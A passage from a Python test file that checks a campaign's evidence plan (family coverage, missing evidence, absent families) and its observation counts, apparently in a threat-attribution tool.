                    contradictions=dumps([]),
                    algorithm_version=ALGORITHM_VERSION,
                    created_at=iso(now),
                    updated_at=iso(now),
                    expires_at=None,
                    status="active",
                    campaign_id=campaign_id,
                )
            )

    detail = get_campaign(campaign_id)
    plan = detail["evidence_plan"]
    assert [item["family"] for item in plan["items"]] == ["intel", "identity"]
    assert plan["items"][0]["missing_on_edges"] == 2
    assert plan["items"][0]["weight_at_stake"] == 0.5
    assert plan["items"][1]["missing_on_edges"] == 1
    assert plan["family_coverage"]["toolchain"] == 1.0
    assert plan["family_coverage"]["intel"] == 0.0
    # Families no edge recorded at all are named separately from ranked gaps.
    assert "targeting" in plan["absent_families"]
    assert "toolchain" not in plan["absent_families"]

    observation = detail["observation"]
    assert observation["observations"] == 20
    assert observation["sessions"] == 3
    assert observation["linked_pairs"] == 2
    assert observation["observations_per_link"] == 10.0
